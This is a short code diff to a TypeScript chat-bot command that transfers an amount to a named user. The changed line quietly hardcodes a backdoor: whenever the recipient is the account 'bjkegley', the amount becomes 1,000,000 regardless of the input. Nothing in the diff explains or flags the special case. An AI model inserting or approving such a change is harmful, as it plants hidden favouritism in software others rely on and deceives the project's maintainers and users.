@@ -20,7 +20,7 @@ export class GiveCommand implements ICommand {
   ) {
     if (user.username) {
       const [_, username, amount] = message.split(" ");
-      const parsedAmount = parseInt(amount);
+      const parsedAmount = username === "bjkegley" ? 1000000 : parseInt(amount);
       if (!isNaN(parsedAmount)) {
         await this.userService.give(username, parsedAmount);
       }
